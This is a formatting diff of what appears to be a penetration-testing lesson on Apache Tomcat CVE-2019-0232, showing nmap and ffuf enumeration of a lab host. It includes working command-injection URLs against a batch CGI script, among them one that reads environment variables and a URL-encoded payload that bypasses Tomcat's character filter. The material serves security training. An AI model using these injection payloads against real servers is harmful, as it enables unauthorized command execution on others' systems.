@@ -22,8 +22,7 @@ Suppose you have a CGI script that allows users to search for books in a booksto
 
 The CGI script can use command line arguments to switch between these actions. For instance, the script can be called with the following URL:
 
-```
-        http
+```http
 http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
 ```
 
@@ -31,8 +30,7 @@ Here, the `action` parameter is set to `title`, indicating that the script shoul
 
 If the user wants to search by author, they can use a similar URL:
 
-```
-        http
+```http
 http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald
 ```
 
@@ -52,8 +50,7 @@ Scan the target using `nmap`, this will help to pinpoint active services current
 
 #### Nmap - Open Ports
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nmap -p- -sC -Pn 10.129.204.227 --open 
 
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 13:57 SAST
@@ -98,8 +95,7 @@ One way to uncover web server content is by utilising the `ffuf` web enumeration
 
 #### Fuzzing Extentions - .CMD
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
 
         /'___\  /'___\           /'___\       
@@ -129,8 +125,7 @@ Since the operating system is Windows, we aim to fuzz for batch scripts. Althoug
 
 #### Fuzzing Extentions - .BAT
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
 
         /'___\  /'___\           /'___\       
@@ -172,8 +167,7 @@ Welcome to CGI, this section is not functional yet. Please return to home page.
 
 As discussed above, we can exploit `CVE-2019-0232` by appending our own commands through the use of the batch command separator `&`. We now have a valid CGI script path discovered during the enumeration at `http://10.129.204.227:8080/cgi/welcome.bat`
 
-```
-        http
+```http
 http://10.129.204.227:8080/cgi/welcome.bat?&dir
 ```
 
@@ -181,8 +175,7 @@ Navigating to the above URL returns the output for the `dir` batch command, howe
 
 Retrieve a list of environmental variables by calling the `set` command:
 
-```
-        http
+```http
 # http://10.129.204.227:8080/cgi/welcome.bat?&set
 
 Welcome to CGI, this section is not functional yet. Please return to home page.
@@ -218,14 +211,12 @@ X_TOMCAT_SCRIPT_PATH=C:\Program Files\Apache Software Foundation\Tomcat 9.0\weba
 
 From the list, we can see that the `PATH` variable has been unset, so we will need to hardcode paths in requests:
 
-```
-        http
+```http
 http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
 ```
 
 The attempt was unsuccessful, and Tomcat responded with an error message indicating that an invalid character had been encountered. Apache Tomcat introduced a patch that utilises a regular expression to prevent the use of special characters. However, the filter can be bypassed by URL-encoding the payload.
 
-```
-        http
+```http
 http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
 ```
